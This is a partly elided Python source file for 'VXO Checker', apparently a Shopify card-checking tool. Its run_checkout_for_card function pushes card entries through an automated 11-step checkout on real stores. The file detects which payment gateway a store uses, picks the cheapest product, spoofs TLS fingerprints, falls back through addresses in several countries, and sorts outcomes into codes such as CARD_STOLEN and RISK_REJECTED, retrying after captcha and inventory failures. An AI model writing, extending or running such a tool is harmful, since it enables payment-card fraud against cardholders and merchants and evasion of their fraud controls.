import json
"""
VXO Checker — Shopify Checkout Engine (Final)
================================================
...
Features:
    ✓ Gateway detection (30+ gateways)
    ✓ Payment method identifier extraction
    ✓ TLS spoofing (curl_cffi)
    ✓ 11-step checkout flow
    ✓ Address fallback (10 countries)
    ✓ Tax retry
    ✓ Poll for receipt
...
class CheckResult:
    ...
    shop_url: str = ""
    receipt_url: str = ""
    gateway: str = "unknown"          # ← الدفع المكتشف
    payment_method_id: str = ""       # ← paymentMethodIdentifier
...
GATEWAY_SIGNATURES: Dict[str, List[str]] = {
    "shopify_payments": ["shopify_payments", "shopifycs.com", "shopifyinc.com"],
    "authorize.net":    ["authorize.net", "authorizenet", "useAuthorizeUrl",
                          "accept.authorize.net", "AcceptUI", "apiLoginID", "anet_"],
    ...
    "square":           ["squareup.com", "square.com/payments", "SqPaymentForm"],
    "adyen":            ["adyen.com", "checkoutshopper", "adyen-checkout", "AdyenCheckout"],
    "cybersource":      ["cybersource.com", "flex.cybersource", "microform"],
    "worldpay":         ["worldpay.com", "secure.worldpay"],
    "checkout.com":     ["checkout.com"],
    "mollie":           ["mollie.com"],
    "paypal":           ["paypal.com/sdk/js", "paypalobjects.com/api"],
    "klarna":           ["klarna.com", "Klarna(", "klarna-checkout"],
    "affirm":           ["affirm.com", "affirm.js"],
    "afterpay":         ["afterpay.com", "afterpay.js", "clearpay"],
    "razorpay":         ["razorpay.com", "rzp_"],
    "payu":             ["payu.com", "payu.in"],
    "mercadopago":      ["mercadopago.com"],
    "sofort":           ["sofort.com", "sofortueberweisung"],
    "ideal":            ["ideal.nl", "ideal-checkout"],
    "giropay":          ["giropay.de"],
...
WALLET_TYPENAMES = {
    ...
    "PaypalWalletConfig", "VenmoWalletConfig", "AmazonPayWalletConfig",
    "MetaPayWalletConfig",
}

WALLET_NAMES = {
    "SHOP_PAY", "APPLE_PAY", "GOOGLE_PAY", "PAYPAL_EXPRESS",
    "VENMO", "AMAZON_PAY", "META_PAY",
}


def _find_key(obj: any, key: str):
...
def detect_gateway_from_html(checkout_html: str) -> str:
    """Detect gateway from HTML patterns."""
    lower = checkout_html.lower()
    for gate_name, signatures in GATEWAY_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in lower:
                logger.info(f"gate_detected_via_html gate={gate_name} sig={sig}")
                return gate_name
    return ""


def detect_gateway_from_graphql(proposal_body: str) -> str:
    """Detect gateway from GraphQL response (most accurate)."""
    try:
        data = json.loads(proposal_body)
    except (json.JSONDecodeError, TypeError):
        return ""

    lines = _find_key(data, "availablePaymentLines") or []
    ...
    for pl in lines:
        ...
        display = (pm.get("extensibilityDisplayName") or "").lower()

        # تجاهل Wallets
        if typename in WALLET_TYPENAMES:
            continue
        if name.upper() in WALLET_NAMES:
            continue

        combined = f"{typename} {name} {display}".lower()
        for gate_name, signatures in GATEWAY_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in combined:
                    logger.info(f"gate_detected_via_graphql gate={gate_name} sig={sig}")
                    return gate_name

    return ""


def detect_gateway(client: TLSClient, shop_url: str,
                    checkout_html: str = "",
                    proposal_body: str = "") -> str:
    """
    Detect gateway from multiple sources (priority order):
      1. GraphQL response (most accurate)
      2. HTML checkout
      3. /payments/config
    """
    # 1. GraphQL (most accurate)
    if proposal_body:
        gate = detect_gateway_from_graphql(proposal_body)
        if gate:
            return gate

    # 2. HTML checkout
    if checkout_html:
        gate = detect_gateway_from_html(checkout_html)
        if gate:
            return gate

    # 3. /payments/config
    try:
        resp = client.get(f"{shop_url}/payments/config",
                          headers={"Accept": "application/json"})
        if resp.status_code == 200:
            gate = detect_gateway_from_html(resp.text)
            if gate:
                return gate
    except Exception:
        pass
    ...
    # default
    logger.warning("gate_default_shopify_payments")
    return "shopify_payments"


def extract_payment_method_id(proposal_body: str) -> str:
    """
    Extract paymentMethodIdentifier for primary (non-wallet) gateway.
    Works with all gateways: shopify_payments, authorize.net, stripe, etc.
    """
    try:
        data = json.loads(proposal_body)
    except (json.JSONDecodeError, TypeError):
    ...
    for pl in lines:
        ...
        if typename in WALLET_TYPENAMES:
            continue
        name = (pm.get("name") or "").upper()
        if name in WALLET_NAMES:
            continue

        if pid:
            logger.info(f"payment_id_found id={pid[:20]}... typename={typename}")
            return pid
        if not fallback_id:
            fallback_id = pid or ""
...
def find_cheapest_product(client: TLSClient, shop_url: str,
    ...
    """Fetch /products.json, filter by price, pick smart variant."""
...
def extract_source_token(checkout_html: str) -> str:
    match = re.search(
        r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"',
        checkout_html
    )
...
def extract_vault_url(checkout_html: str) -> str:
    ...
    m = re.search(
        r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)',
        decoded
    )
    if m:
        return m.group(1)
    ...
    try:
        ...
        if "deliveryExpectations" in de:
            ...
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") or x.get("deliveryOptionHandle")
...
def extract_seller_total(proposal_body: str) -> str:
    match = re.search(
        r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body
    )
    return match.group(1) if match else ""
...
def extract_receipt_id(submit_body: str) -> str:
    match = re.search(
        r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"',
        submit_body
    )
    return match.group(1) if match else ""
...
_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "risky": "RISK_REJECTED", "risk": "RISK_REJECTED",
    "fraud": "RISK_REJECTED", "suspected fraud": "RISK_REJECTED",
    ...
    "stolen card": "CARD_STOLEN", "lost card": "CARD_STOLEN",
...
def patch_payload(payload: str, currency: str, country: str) -> str:
    """Patch currency/country into serialized GQL payload."""
...
def send_proposal(client: TLSClient, shop_url: str, checkout_url: str,
                  checkout_token: str, session_token: str, stable_id: str,
                  variant_id: str, price: str, proposal_id: str,
                  build_id: str, source_token: str,
...
def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str,
                   checkout_token: str, session_token: str, stable_id: str,
                   variant_id: str, price: str, proposal_id: str,
...
def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str,
                   checkout_token: str, session_token: str, stable_id: str,
                   variant_id: str, price: str, proposal_id: str,
                   build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address,
                   currency: str, country: str) -> Tuple[int, str]:
...
def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str,
                          checkout_token: str, session_token: str,
                          build_id: str, source_token: str, poll_id: str,
                          receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:
...
def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str,
                                checkout_token: str, session_token: str,
                                stable_id: str, variant_id: str, price: str,
                                submit_id: str, build_id: str, source_token: str,
                                queue_token: str, email: str, addr: Address,
                                delivery_handle: str, shipping_amount: str,
                                total_amount: str, pci_session_id: str,
                                attempt_token: str, currency: str, country: str,
                                signed_handles: List[str],
                                is_digital: bool = False,
                                item_amount: str = None,
                                tax_amount: str = None,
                                payment_method_id: str = "") -> Tuple[int, str]:
    ...
    # paymentMethodIdentifier (optional)
    payment_id_block = ""
    if payment_method_id:
        payment_id_block = f'"paymentMethodIdentifier": "{payment_method_id}",'
...
def check_submit_errors(status: int, body: str):
    ...
    match = re.search(
        r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"',
        body
    )
    if match:
...
def run_checkout_for_card(shop_url: str, card_entry: str,
    ...
    """Enhanced version with gateway detection."""
    currency = "USD"
    country = "US"
    ...
    try:
        ...
        try:
            ...
            title, product_id, variant_id, price = find_cheapest_product(
                client, shop_url, max_price=_max_p
            )
        ...
        try:
            ...
            # ← كشف البوابة من HTML
            detected_gate = detect_gateway(client, shop_url, checkout_html=checkout_html)
            result.gateway = detected_gate
            logger.info(f"Step 1 OK: gateway={detected_gate}")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
        ...
        try:
            ...
            # ← كشف البوابة من GraphQL (الأدق)
            detected_gate = detect_gateway(
                client, shop_url,
                checkout_html=checkout_html,
                proposal_body=proposal_body,
            )
            result.gateway = detected_gate
            logger.info(f"Step 4 OK: gateway={detected_gate}")

            # ← استخرج payment_method_id
            result.payment_method_id = extract_payment_method_id(proposal_body)
            logger.info(f"Step 4 OK: payment_method_id={result.payment_method_id[:20]}...")
        ...
        # ── Step 5: Proposal 2 (email) ─────────────────────────
        try:
            _p5_status, proposal2_body = send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
            ...
            if not receipt_id:
                ...
                if error_msg:
                    ...
                    result.retryable = any(
                        ...
                        for keyword in ['inventory', 'retry', 'try again', 'generic']
                    )
                else:
                    result.status = CheckStatus.ERROR
        ...
        for poll_num in range(1, 21):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id,
                ...
                if receipt_type == "FailedReceipt":
                    ...
                    if "CAPTCHA" in error_code:
                        ...
                        if "InventoryReservationFailure" in poll_body:
                            ...
                            result.retryable = True
                            return result
                        _site_signals = ["fraud", "not supported", "brand",
                                          "suspected", "risk", "shipping",
